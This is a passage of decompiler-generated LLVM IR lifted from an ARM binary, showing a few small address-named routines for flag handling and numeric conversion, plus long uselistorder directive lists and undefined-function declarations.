  uselistorder i1* @cpsr_z, { 32, 2, 33, 34, 35, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 49, 19, 20, 21, 22, 23, 24, 1, 25, 26, 44, 45, 46, 47, 27, 28, 42, 29, 30, 31, 41, 43, 48 }
  uselistorder i32* @lr, { 32, 33, 34, 35, 36, 37, 38, 39, 4, 5, 6, 7, 40, 0, 41, 1, 42, 43, 44, 45, 46, 47, 79, 80, 48, 8, 9, 10, 13, 14, 15, 16, 17, 18, 78, 121, 122, 123, 124, 125, 126, 127, 128, 129, 19, 20, 21, 22, 23, 24, 25, 26, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 27, 11, 12, 97, 98, 99, 60, 61, 77, 81, 82, 83, 28, 29, 92, 130, 131, 30, 31, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 2, 113, 114, 116, 117, 115, 62, 63, 64, 65, 66, 3, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 96, 118, 119, 120, 84, 85, 86, 87, 88, 89, 90, 91, 93, 94, 95 }
}

define i32 @function_197d0() local_unnamed_addr {
dec_label_pc_197d0:
  %v0_197d4 = call i32 @function_1973c()
  %v0_197d8 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_197d8 to i32
  %.v0_197d4. = xor i32 %tmp2, 1
  ret i32 %.v0_197d4.

; uselistorder directives
  uselistorder i32 1, { 442, 453, 543, 454, 443, 544, 861, 224, 862, 806, 863, 545, 255, 257, 256, 262, 261, 258, 259, 260, 864, 546, 865, 547, 86, 87, 84, 85, 332, 333, 334, 424, 95, 548, 308, 309, 866, 867, 158, 157, 868, 370, 371, 372, 549, 368, 369, 1002, 385, 1003, 183, 808, 550, 365, 366, 367, 551, 173, 552, 80, 81, 82, 553, 219, 218, 220, 869, 870, 871, 554, 311, 313, 312, 310, 555, 121, 122, 119, 125, 123, 120, 124, 191, 556, 315, 319, 323, 318, 321, 320, 317, 324, 322, 316, 49, 203, 202, 809, 461, 810, 811, 812, 813, 814, 557, 51, 52, 50, 53, 226, 225, 400, 439, 401, 1047, 1048, 1049, 1050, 425, 558, 282, 991, 992, 97, 98, 408, 815, 1118, 993, 994, 995, 409, 996, 817, 816, 391, 559, 997, 560, 290, 291, 292, 289, 872, 410, 873, 1120, 411, 1121, 1122, 1123, 1124, 1125, 1126, 804, 1127, 1128, 1129, 1130, 1131, 1132, 805, 534, 562, 561, 355, 356, 361, 363, 362, 357, 354, 358, 360, 359, 821, 818, 819, 820, 436, 412, 138, 136, 137, 140, 139, 462, 822, 823, 824, 825, 563, 535, 141, 142, 826, 564, 114, 116, 117, 118, 115, 463, 827, 566, 565, 285, 287, 286, 283, 284, 288, 828, 567, 268, 267, 266, 829, 830, 568, 211, 210, 413, 426, 874, 875, 876, 464, 877, 398, 427, 395, 414, 878, 465, 879, 880, 881, 0, 882, 389, 883, 386, 884, 466, 885, 886, 887, 428, 888, 581, 580, 579, 578, 577, 576, 575, 574, 573, 572, 571, 570, 536, 569, 24, 30, 23, 25, 33, 21, 22, 32, 26, 31, 35, 28, 27, 29, 34, 970, 971, 38, 36, 41, 39, 40, 37, 42, 7, 582, 269, 583, 83, 831, 832, 833, 834, 835, 836, 837, 838, 415, 586, 585, 584, 336, 335, 339, 338, 337, 340, 889, 890, 891, 587, 103, 105, 104, 106, 101, 102, 107, 839, 840, 841, 589, 588, 134, 135, 892, 591, 590, 146, 144, 143, 145, 148, 147, 429, 449, 594, 593, 592, 467, 842, 595, 272, 843, 844, 845, 846, 847, 468, 596, 109, 111, 110, 113, 112, 469, 64, 807, 597, 275, 470, 598, 271, 444, 471, 599, 182, 180, 181, 600, 242, 241, 240, 601, 94, 93, 602, 217, 603, 247, 246, 604, 278, 279, 605, 175, 606, 223, 222, 607, 364, 608, 331, 609, 159, 610, 611, 200, 201, 1133, 472, 1134, 473, 612, 59, 54, 60, 58, 56, 61, 55, 62, 57, 174, 474, 239, 238, 613, 305, 306, 63, 1060, 1061, 616, 615, 614, 213, 248, 396, 848, 849, 850, 617, 893, 620, 619, 618, 214, 621, 179, 402, 972, 403, 973, 974, 397, 975, 295, 296, 294, 297, 298, 301, 300, 299, 976, 404, 851, 44, 47, 46, 45, 48, 1004, 430, 431, 1005, 623, 622, 18, 16, 15, 19, 20, 17, 624, 153, 155, 151, 149, 150, 152, 154, 625, 99, 626, 627, 280, 281, 628, 108, 629, 1135, 432, 475, 631, 630, 632, 245, 1064, 1067, 1068, 1069, 633, 373, 378, 379, 377, 376, 380, 374, 375, 1070, 1071, 1072, 1073, 634, 345, 351, 344, 350, 349, 343, 353, 352, 347, 341, 346, 342, 348, 1065, 1066, 476, 635, 196, 195, 194, 197, 1074, 1075, 1076, 1077, 1078, 1079, 445, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 478, 1088, 1089, 1090, 1091, 1092, 477, 1093, 1094, 1095, 1096, 1097, 636, 163, 165, 161, 164, 167, 172, 171, 169, 170, 168, 166, 162, 216, 215, 479, 480, 894, 399, 640, 639, 638, 637, 190, 100, 416, 254, 641, 253, 252, 176, 642, 221, 643, 212, 644, 205, 277, 645, 207, 206, 646, 96, 647, 977, 978, 304, 649, 648, 302, 303, 859, 650, 895, 896, 651, 381, 417, 1119, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 652, 186, 184, 185, 187, 188, 189, 1036, 1037, 10, 9, 418, 915, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 43, 999, 998, 1112, 1113, 852, 853, 854, 855, 856, 857, 858, 1136, 88, 89, 90, 91, 481, 653, 482, 916, 917, 918, 654, 537, 129, 126, 127, 130, 128, 440, 919, 920, 484, 921, 922, 923, 924, 925, 485, 926, 927, 928, 929, 930, 486, 932, 434, 433, 931, 483, 933, 934, 487, 935, 936, 937, 659, 542, 658, 657, 656, 655, 71, 67, 70, 65, 75, 66, 74, 69, 73, 72, 68, 938, 660, 326, 330, 328, 329, 325, 327, 419, 661, 229, 230, 939, 940, 941, 78, 79, 76, 77, 441, 390, 943, 944, 405, 945, 946, 1, 2, 947, 949, 392, 950, 489, 951, 406, 948, 488, 671, 670, 669, 668, 667, 666, 665, 664, 663, 662, 11, 12, 13, 490, 420, 672, 131, 132, 133, 942, 450, 538, 952, 673, 8, 674, 382, 491, 860, 675, 421, 953, 676, 677, 274, 273, 678, 276, 265, 679, 244, 680, 307, 681, 209, 208, 199, 198, 228, 227, 682, 193, 192, 683, 160, 684, 685, 250, 249, 686, 156, 92, 687, 314, 688, 689, 232, 231, 690, 270, 691, 264, 263, 387, 1103, 293, 954, 393, 407, 955, 956, 957, 388, 495, 958, 959, 960, 446, 961, 496, 962, 963, 964, 493, 494, 447, 497, 492, 965, 697, 696, 695, 694, 693, 692, 966, 967, 704, 703, 702, 701, 700, 539, 699, 698, 498, 968, 969, 706, 705, 979, 980, 499, 500, 708, 707, 981, 982, 503, 983, 501, 984, 985, 502, 986, 504, 383, 717, 716, 715, 714, 713, 712, 711, 710, 709, 177, 987, 505, 988, 989, 506, 990, 507, 384, 726, 725, 724, 723, 722, 721, 720, 719, 718, 251, 1000, 1001, 508, 732, 731, 730, 729, 728, 727, 235, 1006, 509, 1007, 1008, 1009, 738, 737, 736, 735, 734, 733, 234, 1015, 512, 1010, 511, 1011, 510, 1012, 1013, 514, 1014, 513, 803, 1016, 747, 746, 745, 744, 743, 742, 741, 740, 739, 237, 236, 455, 1017, 748, 751, 750, 749, 3, 515, 437, 753, 752, 451, 1018, 516, 517, 1020, 1019, 518, 756, 755, 754, 456, 1021, 1022, 519, 520, 521, 1023, 540, 1024, 522, 757, 452, 523, 524, 1025, 525, 1026, 765, 764, 763, 762, 761, 760, 759, 758, 435, 1027, 1028, 1029, 526, 394, 1030, 1031, 1032, 527, 1033, 769, 768, 767, 766, 541, 1034, 204, 1035, 770, 528, 1045, 773, 772, 771, 1046, 243, 774, 458, 1051, 1052, 457, 1053, 1054, 459, 460, 1055, 1056, 775, 1057, 4, 5, 1059, 1058, 529, 778, 777, 776, 530, 1062, 1063, 780, 779, 783, 782, 781, 786, 785, 784, 788, 787, 1098, 1099, 531, 1100, 1101, 438, 1102, 791, 790, 789, 448, 6, 795, 794, 793, 792, 423, 1104, 1105, 1106, 422, 1107, 1108, 1109, 532, 797, 796, 533, 1110, 1111, 799, 798, 14, 1114, 1115, 800, 233, 1116, 1117, 178, 801, 802 }
  uselistorder i1 false, { 26, 27, 10, 11, 8, 12, 34, 35, 36, 37, 38, 39, 6, 7, 9, 40, 41, 0, 16, 17, 18, 28, 13, 15, 29, 30, 31, 32, 33, 25, 1, 3, 42, 14, 19, 22, 21, 20, 23, 4, 5, 24, 2, 43, 44, 45, 46 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_1973c, { 1, 0 }
}

define i32 @function_197e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_197e8:
  %v1_197e8 = icmp slt i32 %arg2, 0
  %v2_197e8 = mul i32 %arg2, 2
  br i1 %v1_197e8, label %dec_label_pc_1981c, label %dec_label_pc_197f0

dec_label_pc_197f0:                               ; preds = %dec_label_pc_197e8
  %v1_197f0 = add i32 %v2_197e8, 2097152
  %v2_197f0 = icmp ugt i32 %v2_197e8, -2097153
  br i1 %v2_197f0, label %dec_label_pc_19824, label %dec_label_pc_197f8

dec_label_pc_197f8:                               ; preds = %dec_label_pc_197f0
  %v6_197f0 = icmp slt i32 %v1_197f0, 0
  br i1 %v6_197f0, label %dec_label_pc_197fc, label %dec_label_pc_1981c

dec_label_pc_197fc:                               ; preds = %dec_label_pc_197f8
  %v4_19800 = sdiv i32 %v1_197f0, 2097152
  %v5_19800 = sub nsw i32 -993, %v4_19800
  %v11_19800 = icmp slt i32 %v5_19800, 0
  br i1 %v11_19800, label %dec_label_pc_1982c, label %dec_label_pc_19808

dec_label_pc_19808:                               ; preds = %dec_label_pc_197fc
  %v3_19808 = mul i32 %arg2, 2048
  %v4_19810 = udiv i32 %arg1, 2097152
  %v1_1980c = or i32 %v4_19810, %v3_19808
  %v5_19810 = or i32 %v1_1980c, -2147483648
  %v6_19814 = lshr i32 %v5_19810, %v5_19800
  ret i32 %v6_19814

dec_label_pc_1981c:                               ; preds = %dec_label_pc_197f8, %dec_label_pc_197e8
  ret i32 0

dec_label_pc_19824:                               ; preds = %dec_label_pc_197f0
  %v4_19824 = mul i32 %arg2, 4096
  %v5_19824 = or i32 %v4_19824, %arg1
  %v7_19824 = icmp eq i32 %v5_19824, 0
  br i1 %v7_19824, label %dec_label_pc_1982c, label %dec_label_pc_19834

dec_label_pc_1982c:                               ; preds = %dec_label_pc_19824, %dec_label_pc_197fc
  ret i32 -1

dec_label_pc_19834:                               ; preds = %dec_label_pc_19824
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 38, 227, 145, 146, 41, 42, 39, 40, 147, 43, 144, 148, 149, 150, 1, 151, 152, 2, 3, 153, 244, 235, 71, 245, 154, 246, 247, 229, 230, 231, 72, 232, 73, 233, 4, 155, 44, 45, 248, 156, 69, 46, 157, 249, 47, 5, 48, 158, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 159, 160, 6, 161, 114, 236, 237, 162, 74, 238, 163, 75, 250, 164, 165, 251, 252, 70, 64, 65, 253, 254, 255, 256, 257, 117, 76, 258, 118, 7, 143, 66, 67, 166, 259, 281, 282, 167, 128, 283, 260, 8, 49, 168, 239, 240, 129, 169, 261, 262, 130, 241, 170, 10, 9, 171, 172, 11, 234, 173, 77, 323, 78, 263, 79, 299, 63, 300, 80, 295, 81, 228, 82, 83, 293, 12, 84, 301, 302, 13, 174, 175, 176, 177, 303, 284, 285, 131, 85, 242, 62, 178, 14, 179, 15, 180, 132, 304, 19, 181, 182, 18, 20, 305, 17, 183, 184, 50, 16, 185, 51, 52, 53, 54, 186, 187, 188, 59, 264, 265, 21, 294, 86, 288, 87, 88, 286, 89, 306, 90, 290, 91, 92, 279, 93, 289, 60, 189, 266, 142, 55, 56, 190, 191, 192, 193, 194, 94, 195, 196, 141, 267, 95, 268, 197, 269, 270, 198, 271, 272, 57, 273, 274, 68, 275, 199, 200, 115, 119, 116, 276, 22, 201, 133, 277, 202, 61, 23, 24, 96, 296, 97, 325, 98, 280, 99, 100, 307, 101, 243, 102, 327, 103, 287, 104, 324, 105, 292, 106, 278, 107, 291, 108, 109, 297, 110, 326, 111, 298, 203, 204, 112, 134, 205, 206, 207, 29, 30, 31, 25, 26, 27, 28, 208, 209, 210, 211, 212, 135, 136, 213, 214, 215, 32, 58, 33, 34, 113, 137, 138, 139, 35, 216, 217, 218, 125, 126, 127, 36, 219, 120, 121, 122, 123, 124, 37, 220, 221, 222, 223, 224, 225, 226, 140 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 22, 5, 6, 23, 7, 8, 9, 10, 24, 25, 16, 26, 27, 13, 11, 14, 31, 15, 17, 18, 28, 19, 29, 20, 30, 12, 21 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 8, 13, 14, 15, 16, 17, 18, 9 }
  uselistorder i32 2097152, { 8, 9, 16, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7, 15 }
  uselistorder i32 2, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 160, 35, 36, 37, 145, 38, 39, 40, 41, 42, 161, 162, 163, 146, 153, 43, 44, 45, 154, 155, 46, 47, 86, 87, 88, 193, 194, 104, 195, 196, 89, 197, 198, 156, 147, 164, 84, 165, 166, 48, 49, 167, 168, 157, 148, 115, 116, 50, 158, 51, 90, 52, 53, 102, 159, 54, 199, 103, 184, 55, 56, 185, 57, 58, 83, 59, 60, 61, 62, 105, 186, 187, 63, 64, 0, 149, 188, 65, 189, 150, 91, 92, 93, 107, 94, 108, 95, 96, 117, 97, 99, 98, 100, 85, 169, 170, 113, 66, 67, 68, 69, 70, 114, 171, 109, 106, 71, 172, 173, 174, 151, 152, 72, 73, 74, 144, 75, 76, 77, 78, 79, 118, 175, 176, 119, 120, 121, 122, 123, 124, 80, 125, 126, 81, 110, 177, 127, 128, 111, 129, 130, 131, 132, 134, 178, 133, 179, 135, 136, 143, 137, 138, 180, 181, 182, 139, 183, 101, 140, 141, 142, 190, 112, 191, 82, 192 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1983c() local_unnamed_addr {
entry:
  %v3_19840 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_19840)
  %v31_19848 = load i32, i32* @r0, align 4
  ret i32 %v31_19848

; uselistorder directives
  uselistorder i32* @r0, {}
  uselistorder void (i32)* @__pseudo_branch, { 0, 55, 56, 7, 8, 9, 10, 11, 12, 78, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 57, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 1, 2, 3, 4, 5, 6, 84, 85, 86, 87, 79, 70, 80, 81, 82, 83, 47, 64, 65, 66, 48, 49, 50, 51, 52, 53, 67, 68, 69, 88, 89, 90, 54, 71, 72, 73, 74, 75, 76, 91, 58, 59, 60, 61, 62, 63, 77 }
  uselistorder i32 0, { 0, 775, 1, 776, 777, 606, 374, 375, 778, 779, 780, 781, 782, 783, 784, 785, 786, 3, 4, 5, 787, 788, 2, 789, 790, 607, 6, 791, 792, 34, 608, 793, 794, 795, 796, 797, 798, 799, 800, 93, 92, 191, 192, 193, 801, 802, 803, 7, 804, 805, 35, 806, 807, 808, 36, 37, 184, 809, 810, 811, 812, 38, 185, 384, 813, 814, 815, 816, 817, 818, 39, 819, 9, 8, 40, 609, 820, 622, 610, 821, 822, 823, 824, 825, 10, 635, 636, 637, 638, 639, 640, 641, 642, 623, 643, 644, 826, 827, 828, 829, 830, 831, 11, 832, 611, 833, 834, 835, 836, 186, 187, 385, 837, 838, 13, 12, 839, 840, 841, 842, 843, 844, 845, 612, 613, 846, 624, 847, 848, 625, 626, 849, 850, 614, 851, 852, 853, 854, 855, 41, 14, 1164, 1165, 1166, 1167, 115, 1168, 194, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 195, 615, 627, 616, 617, 1176, 1177, 1178, 1179, 1180, 1181, 856, 857, 116, 669, 670, 671, 672, 673, 858, 859, 860, 861, 862, 863, 196, 94, 333, 864, 865, 866, 79, 674, 386, 675, 676, 677, 128, 867, 387, 868, 869, 870, 871, 872, 873, 340, 341, 649, 650, 678, 197, 651, 652, 342, 653, 654, 655, 15, 129, 130, 679, 388, 198, 680, 681, 682, 683, 684, 131, 208, 205, 201, 203, 204, 202, 206, 199, 200, 207, 685, 686, 687, 688, 132, 1251, 1252, 1253, 1254, 210, 209, 211, 1255, 689, 690, 691, 292, 1355, 80, 293, 1359, 1360, 108, 55, 133, 628, 874, 56, 134, 875, 876, 294, 1146, 1147, 295, 57, 692, 98, 212, 1148, 1149, 135, 629, 297, 877, 58, 109, 878, 879, 296, 1361, 1362, 1363, 1364, 1365, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1366, 1367, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 42, 1386, 1387, 1388, 1389, 1390, 43, 1391, 1392, 1393, 44, 1394, 1395, 1396, 45, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1421, 1422, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 46, 1440, 1441, 1442, 1443, 1444, 47, 1445, 1446, 1447, 1448, 1449, 48, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 213, 693, 630, 694, 695, 696, 697, 698, 389, 390, 699, 700, 136, 137, 138, 701, 702, 706, 703, 704, 705, 298, 332, 707, 708, 139, 214, 711, 709, 710, 299, 712, 140, 713, 714, 16, 17, 141, 715, 880, 881, 882, 883, 884, 216, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 143, 142, 217, 218, 897, 898, 899, 900, 901, 902, 144, 145, 903, 904, 905, 906, 907, 908, 49, 909, 910, 911, 912, 913, 59, 219, 914, 146, 393, 915, 916, 917, 918, 919, 394, 920, 395, 921, 922, 391, 923, 924, 392, 925, 926, 927, 344, 928, 929, 930, 931, 215, 932, 933, 221, 934, 343, 935, 50, 936, 937, 938, 939, 940, 941, 396, 942, 943, 397, 398, 944, 945, 946, 220, 947, 948, 949, 950, 951, 952, 1088, 1089, 1090, 1091, 631, 1092, 1093, 1094, 1095, 1096, 1097, 954, 953, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 147, 716, 717, 718, 81, 82, 719, 720, 721, 222, 722, 723, 724, 725, 726, 399, 727, 728, 729, 730, 731, 148, 969, 970, 971, 18, 972, 300, 732, 149, 733, 734, 735, 736, 19, 20, 974, 973, 301, 975, 976, 150, 977, 223, 225, 737, 224, 738, 226, 739, 151, 740, 745, 746, 741, 742, 743, 748, 749, 750, 227, 751, 752, 753, 754, 755, 744, 747, 756, 152, 656, 657, 658, 228, 645, 646, 229, 659, 663, 664, 665, 666, 230, 345, 231, 334, 335, 400, 660, 232, 661, 662, 153, 667, 1465, 978, 1280, 1281, 1282, 1283, 233, 1284, 1267, 648, 668, 1268, 1264, 154, 234, 1466, 1467, 1269, 1285, 1286, 155, 235, 401, 1471, 1472, 402, 1473, 1474, 236, 303, 1475, 1476, 403, 83, 1477, 1478, 404, 1486, 1489, 605, 302, 1490, 405, 1487, 1488, 1468, 1469, 632, 237, 290, 647, 21, 22, 1270, 238, 757, 759, 758, 239, 760, 761, 762, 406, 763, 121, 979, 111, 980, 241, 240, 981, 1470, 1098, 1099, 1100, 1101, 1102, 1103, 243, 156, 1104, 1105, 1106, 112, 242, 1107, 407, 764, 157, 765, 158, 766, 244, 1182, 1183, 1184, 23, 1226, 159, 160, 161, 245, 113, 767, 162, 246, 163, 408, 409, 1481, 346, 247, 621, 164, 248, 1292, 1293, 1294, 1295, 1296, 249, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 250, 1287, 410, 1288, 1289, 411, 1290, 1291, 165, 1304, 1305, 254, 252, 253, 1306, 1307, 260, 259, 189, 251, 1308, 1309, 1310, 1311, 1312, 1313, 337, 336, 347, 412, 1314, 1315, 1316, 84, 1317, 256, 255, 257, 258, 188, 1318, 1319, 304, 1320, 1321, 122, 1322, 1323, 1324, 1325, 1326, 24, 25, 982, 983, 85, 166, 26, 348, 413, 1220, 1185, 1186, 1327, 1240, 1235, 1080, 1236, 1256, 1109, 261, 1108, 262, 770, 263, 264, 984, 985, 266, 986, 987, 265, 988, 167, 1356, 1357, 1358, 305, 989, 990, 991, 267, 992, 993, 306, 994, 123, 1246, 1247, 1248, 27, 124, 125, 1350, 99, 100, 101, 1351, 1352, 1491, 1492, 102, 268, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 168, 1010, 1011, 1012, 1013, 1015, 1016, 1014, 1017, 169, 1018, 1021, 1019, 1020, 414, 415, 416, 417, 1022, 1023, 1024, 269, 270, 1025, 1026, 1027, 1028, 1029, 1030, 418, 1031, 1032, 419, 1033, 1035, 271, 1034, 307, 291, 1036, 1037, 1039, 170, 1040, 273, 1041, 89, 90, 87, 88, 1042, 420, 117, 114, 1043, 1044, 1045, 276, 274, 275, 421, 1046, 1047, 1048, 86, 272, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 422, 118, 330, 95, 1058, 1059, 1060, 28, 277, 768, 769, 126, 91, 110, 1038, 308, 171, 1061, 1062, 1063, 29, 30, 771, 772, 423, 773, 172, 1064, 1065, 173, 31, 1271, 1482, 1479, 1081, 1066, 1348, 774, 1485, 1216, 1480, 1272, 1262, 1067, 1241, 1233, 424, 1273, 1483, 119, 1484, 1274, 32, 1329, 1330, 120, 1331, 1332, 1333, 1334, 1335, 278, 1336, 618, 633, 619, 620, 1337, 634, 60, 61, 338, 431, 432, 309, 433, 1068, 430, 53, 54, 434, 1069, 1070, 435, 441, 442, 558, 559, 436, 1071, 1072, 1073, 437, 1074, 1075, 1076, 62, 349, 425, 190, 427, 428, 350, 429, 279, 1077, 438, 1078, 439, 440, 1079, 426, 280, 351, 310, 1083, 443, 1082, 447, 448, 444, 445, 446, 1084, 449, 1085, 376, 1086, 450, 1087, 451, 284, 283, 282, 281, 466, 1110, 352, 452, 353, 1111, 1112, 463, 1113, 1115, 464, 465, 1114, 314, 1116, 462, 467, 1117, 1118, 459, 1119, 1121, 460, 461, 1120, 313, 1122, 468, 1123, 456, 285, 1124, 1126, 457, 458, 286, 1125, 312, 1127, 469, 1128, 453, 287, 1129, 1131, 454, 455, 288, 1130, 311, 1132, 470, 1133, 1134, 1135, 103, 1136, 473, 471, 1137, 478, 477, 316, 1138, 475, 472, 476, 474, 315, 1139, 479, 1140, 63, 480, 481, 482, 1141, 51, 104, 1142, 485, 483, 486, 484, 317, 1143, 487, 1144, 64, 488, 489, 490, 1145, 52, 174, 1150, 493, 65, 354, 1151, 1157, 492, 1152, 1153, 1154, 1155, 1156, 318, 1158, 494, 377, 1159, 1160, 491, 1161, 495, 1162, 1163, 175, 176, 177, 497, 66, 355, 127, 378, 1187, 498, 1188, 496, 1189, 1190, 499, 67, 356, 500, 1191, 1192, 501, 1193, 1194, 527, 1195, 1196, 1197, 1198, 1199, 522, 523, 1200, 524, 1201, 525, 1202, 526, 1203, 1204, 1205, 1206, 532, 533, 519, 1207, 530, 531, 520, 1208, 521, 1209, 1210, 1211, 516, 517, 1212, 518, 503, 1213, 1214, 1215, 511, 512, 1217, 1218, 513, 514, 502, 515, 510, 319, 1219, 505, 1221, 506, 1222, 507, 508, 509, 604, 68, 106, 504, 69, 96, 105, 528, 529, 1223, 379, 1224, 107, 320, 289, 70, 71, 1225, 534, 357, 358, 359, 360, 541, 1227, 1229, 1230, 1231, 536, 1232, 537, 538, 539, 535, 321, 540, 1228, 380, 542, 361, 33, 544, 543, 545, 1234, 362, 363, 364, 365, 1237, 548, 546, 547, 322, 1238, 549, 1239, 72, 555, 73, 554, 550, 1242, 553, 324, 556, 551, 1243, 552, 323, 557, 74, 97, 1244, 366, 560, 561, 1245, 562, 1250, 563, 1249, 565, 566, 564, 1257, 1258, 381, 1259, 1260, 178, 1261, 75, 382, 1263, 325, 567, 568, 569, 570, 1265, 1266, 339, 571, 1275, 1276, 572, 1277, 573, 1278, 1279, 574, 179, 575, 576, 577, 578, 579, 1328, 180, 76, 331, 326, 369, 370, 1338, 1339, 1340, 1341, 327, 367, 368, 371, 1342, 1343, 372, 1344, 1345, 329, 77, 181, 182, 328, 1346, 1347, 383, 183, 78, 580, 1349, 1353, 1354, 373, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507 }
  uselistorder i32* @r4, { 38, 204, 8, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 39, 40, 41, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 6, 236, 64, 9, 65, 66, 67, 10, 68, 69, 70, 71, 72, 73, 74, 237, 238, 75, 76, 239, 240, 241, 46, 47, 48, 49, 50, 42, 77, 78, 79, 80, 81, 82, 83, 84, 85, 11, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 489, 490, 191, 192, 546, 547, 100, 101, 12, 4, 102, 399, 400, 401, 402, 403, 404, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 13, 103, 104, 105, 106, 107, 108, 109, 110, 111, 14, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 372, 15, 373, 374, 375, 376, 377, 378, 379, 380, 252, 253, 16, 254, 255, 256, 17, 257, 18, 258, 259, 260, 261, 262, 5, 263, 0, 264, 265, 122, 123, 19, 124, 20, 125, 21, 126, 127, 128, 129, 130, 131, 132, 266, 133, 134, 135, 267, 1, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 22, 146, 147, 148, 23, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 51, 52, 53, 54, 43, 44, 45, 55, 56, 57, 7, 58, 59, 60, 61, 62, 63, 497, 498, 564, 565, 566, 495, 496, 499, 500, 571, 576, 577, 578, 579, 580, 581, 582, 567, 161, 162, 163, 268, 269, 270, 568, 569, 570, 381, 24, 382, 383, 384, 385, 386, 387, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 407, 408, 409, 410, 25, 2, 411, 412, 413, 414, 415, 471, 472, 178, 179, 180, 416, 417, 418, 419, 420, 421, 174, 175, 176, 177, 181, 182, 473, 474, 475, 476, 477, 478, 572, 575, 183, 184, 185, 186, 187, 501, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 26, 520, 521, 522, 523, 502, 503, 504, 505, 506, 507, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 33, 537, 538, 3, 539, 540, 541, 542, 543, 544, 271, 272, 273, 573, 574, 422, 423, 388, 389, 27, 390, 193, 194, 195, 196, 197, 198, 199, 200, 201, 274, 275, 276, 277, 28, 278, 279, 280, 281, 282, 283, 34, 284, 285, 286, 287, 288, 289, 290, 291, 292, 29, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 30, 342, 343, 344, 345, 346, 188, 189, 190, 327, 328, 35, 32, 329, 347, 348, 349, 293, 294, 202, 203, 350, 351, 352, 31, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 391, 392, 393, 394, 395, 396, 397, 398, 405, 406, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 491, 492, 493, 494, 36, 37, 545 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

declare float @fabsf(float)

